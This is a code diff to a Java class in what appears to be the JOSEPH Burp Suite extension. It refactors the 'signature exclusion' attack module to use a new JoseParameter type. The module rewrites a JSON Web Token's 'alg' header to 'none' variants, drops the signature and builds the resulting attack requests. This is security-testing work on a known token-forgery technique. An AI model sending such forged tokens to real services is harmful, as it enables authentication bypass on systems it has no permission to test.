@@ -23,6 +23,7 @@ import eu.dety.burp.joseph.attacks.AttackPreparationFailedException;
 import eu.dety.burp.joseph.attacks.IAttackInfo;
 import eu.dety.burp.joseph.attacks.SignatureExclusion.SignatureExclusion;
 import eu.dety.burp.joseph.utilities.Decoder;
+import eu.dety.burp.joseph.utilities.JoseParameter;
 
 import javax.swing.*;
 import java.awt.*;
@@ -41,7 +42,7 @@ import java.util.List;
 public class SignatureExclusionInfo implements IAttackInfo {
     private IExtensionHelpers helpers;
     private IHttpRequestResponse requestResponse;
-    private IParameter parameter;
+    private JoseParameter parameter;
 
     // Unique identifier for the attack class
     private static final String id = "signature_exclusion";
@@ -91,7 +92,7 @@ public class SignatureExclusionInfo implements IAttackInfo {
     }
 
     @Override
-    public SignatureExclusion prepareAttack(IBurpExtenderCallbacks callbacks, IHttpRequestResponse requestResponse, IRequestInfo requestInfo, IParameter parameter) throws AttackPreparationFailedException {
+    public SignatureExclusion prepareAttack(IBurpExtenderCallbacks callbacks, IHttpRequestResponse requestResponse, IRequestInfo requestInfo, JoseParameter parameter) throws AttackPreparationFailedException {
         this.requestResponse = requestResponse;
         this.parameter = parameter;
 
@@ -101,18 +102,40 @@ public class SignatureExclusionInfo implements IAttackInfo {
             try {
                 // Change the "alg" header value for each of the noneAlgVariation entries
                 // and rebuild a valid request
-                byte[] tmpRequest = this.requestResponse.getRequest();
-                String[] tmpComponents = Decoder.getComponents(this.parameter.getValue());
+                String[] tmpComponents = Decoder.getComponents(this.parameter.getJoseValue());
                 String tmpDecodedHeader = Decoder.getDecoded(tmpComponents[0]);
                 String tmpReplaced = tmpDecodedHeader.replaceFirst("\"alg\":\"(.+?)\"", "\"alg\":\"" + noneAlgVariation.getValue() + "\"");
                 String tmpReplacedEncoded = Decoder.getEncoded(tmpReplaced);
                 String[] tmpNewComponents = {tmpReplacedEncoded, tmpComponents[1], ""};
                 String tmpParameterValue = Decoder.concatComponents(tmpNewComponents);
 
-                IParameter tmpParameter = helpers.buildParameter(this.parameter.getName(), tmpParameterValue, this.parameter.getType());
-                tmpRequest = helpers.updateParameter(tmpRequest, tmpParameter);
-
+                byte[] tmpRequest = JoseParameter.updateRequest(this.requestResponse.getRequest(), this.parameter, helpers, tmpParameterValue);
                 requests.add(new SignatureExclusionAttackRequest(tmpRequest, noneAlgVariation.getKey().ordinal() , noneAlgVariation.getValue()));
+
+
+//                switch(parameter.getOriginType()) {
+//                    // Update the request with the new header value
+//                    case HEADER:
+//                        List<String> headers = requestInfo.getHeaders();
+//
+//                        for (int i = 0; i < headers.size(); i++) {
+//                            if (headers.get(i).startsWith(parameter.getName())) {
+//                                headers.set(i, headers.get(i).replace(parameter.getJoseValue(), tmpParameterValue));
+//                            }
+//                        }
+//
+//                        tmpRequest =  helpers.buildHttpMessage(headers, Arrays.copyOfRange(this.requestResponse.getRequest(), requestInfo.getBodyOffset(), tmpRequest.length));
+//                        requests.add(new SignatureExclusionAttackRequest(tmpRequest, noneAlgVariation.getKey().ordinal() , noneAlgVariation.getValue()));
+//                        break;
+//
+//                    // Update the request with the new parameter value
+//                    case PARAMETER:
+//                        IParameter tmpParameter = helpers.buildParameter(this.parameter.getName(), tmpParameterValue, this.parameter.getParameterType());
+//                        tmpRequest = helpers.updateParameter(tmpRequest, tmpParameter);
+//                        requests.add(new SignatureExclusionAttackRequest(tmpRequest, noneAlgVariation.getKey().ordinal() , noneAlgVariation.getValue()));
+//                        break;
+//                }
+
             } catch (Exception e) {
                 throw new AttackPreparationFailedException("Attack preparation failed. Message: " + e.getMessage());
             }
